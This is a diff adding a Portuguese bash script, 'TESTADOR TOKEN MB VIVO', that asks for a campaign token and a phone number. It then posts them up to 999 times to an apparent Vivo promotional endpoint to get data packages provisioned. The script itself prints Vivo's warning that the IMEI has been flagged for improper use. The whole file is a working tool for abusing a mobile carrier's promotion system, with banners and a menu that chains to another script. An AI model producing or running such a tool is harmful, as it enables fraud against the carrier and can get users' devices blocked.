@@ -1,0 +1,60 @@
+#!/bin/bash
+clear
+tit=$"ㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿\n\e[33;01m██▀ﾠ█▄█ﾠ█ﾠ▄▀▀ﾠ▄▀▄ﾠ█▀▄ﾠ██▀ﾠ█▄ﾠ█ﾠ██▀ﾠ█▀▄\n█▄▄ﾠ█ﾠ█ﾠ█ﾠ▄██ﾠ▀▄▀ﾠ█▀ﾠﾠ█▄▄ﾠ█ﾠ▀█ﾠ█▄▄ﾠ█▀▄\e[0m\nㅤㅤ⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋\nㅤㅤ⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸"
+echo -e $tit
+sleep .5
+echo
+echo -e "\e[01;37;41m      • TESTADOR TOKEN MB VIVO •        \e[0m"
+sleep .5
+echo
+echo -e "\e[01;37;41m COLE SEU TOKEN \e[0m"
+aa=$(echo -e "\e[01;37mTOKEN:\e[0m")
+read -p "$aa" TOKEN
+echo -e "\e[01;37;41m AGORA O DDD+NUMERO \e[0m"
+aa=$(echo -e "\e[01;37mNÚMERO:\e[0m")
+read -p "$aa" NUMERO
+sleep .5
+VEZES="999"
+clear
+echo -e $tit
+echo
+echo -e "\e[01;37;41m      • TESTADOR TOKEN MB VIVO •        \e[0m"
+echo
+echo -e "\e[01;37;41m VAI BRASILIAM \e[0m"|pv -qL 15
+echo -e "\e[01;37;41m NUMERO: $NUMERO \e[0m"
+echo -e "\e[01;37;41m TOKEN: $TOKEN \e[0m"
+sleep .5
+echo
+echo -e "\e[0m\e[01;37;41m TESTANDO O TOKEN \e[0m"
+for i in $(seq $VEZES);
+do
+response=$(data=$"msisdn=$NUMERO&campid=$TOKEN&opCode=VV" && site="http://interatividade.vivo.ddivulga.com/carrotProcess" && curl -s "${site}" -d "${data}")
+body=$(echo $response | jq '.packprovision')
+pack=$'"packprovisionOK"'
+
+case $body in
+null) echo -e "\e[01;33mTOKEN FULEIRO, TENTE OUTRO...\e[0m"|pv -qL 20; sleep .5; break;;
+$pack) echo -e "\e[01;32mSUCESSO, SÓ ESPERAR CAIR\e[0m \e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo -e "Informe Vivo: IMEI capturado, pode ser bloqueado pelo uso indevido conforme regulamento em nossa Rede, ligue no 1058 \e[0m \e[01;37mFINALIZANDO...\e[0m"; echo $response; break
+esac
+done
+echo
+echo -e "\e[01;37;41m       • Fim de transmissão •        \e[0m"
+echo -e '\e[01;37;41m    Não me viu chegando? quer mais?  \e[0m'
+sleep .5
+while :; do
+echo -e '\e[01;37m(1)\e[0m Sim\e[0m'
+echo -e '\e[01;37m(2)\e[0m Não\e[0m'
+cc=$(echo -e "\e[01;37mOpção:\e[0m")
+read -n1 -p "$cc" cpo
+case $cpo in
+        (1) echo; echo -e '\e[01;37;41m E lá vamos nós | @EhisOpeNer \e[0m'|pv -qL 18
+        sleep 2; ./personalizado
+        break;;
+        (2) echo; echo -e "\e[01;37;41m Bye Bye | @EhisOpeNer \e[0m"|pv -qL 15; echo -e "\e[01;37;41m     TUDO NUMA BOA     \e[0m"|pv -qL 18
+        sleep 1
+        break;;
+        (*) echo; echo -e "\e[01;37;41m CALMA BARBOLETA \e[0m"
+        sleep 1
+esac
+done
